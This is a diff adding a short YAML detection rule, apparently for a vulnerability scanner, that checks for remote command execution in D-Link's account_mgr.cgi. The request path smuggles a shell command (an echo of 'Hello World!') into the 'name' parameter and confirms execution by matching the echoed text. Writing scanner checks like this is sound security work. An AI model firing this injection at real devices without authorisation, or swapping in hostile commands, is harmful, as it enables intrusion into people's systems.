@@ -1,0 +1,10 @@
+cve-id: d-Link-account-mgr-cgi-rce
+rules:
+  - method: GET
+    path: /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;echo%20Hello%20World!;%27
+    expression: |
+      response.status == 200 && response.body.bcontains(b"Hello World!")
+severity:
+  critical
+type: 
+  rce
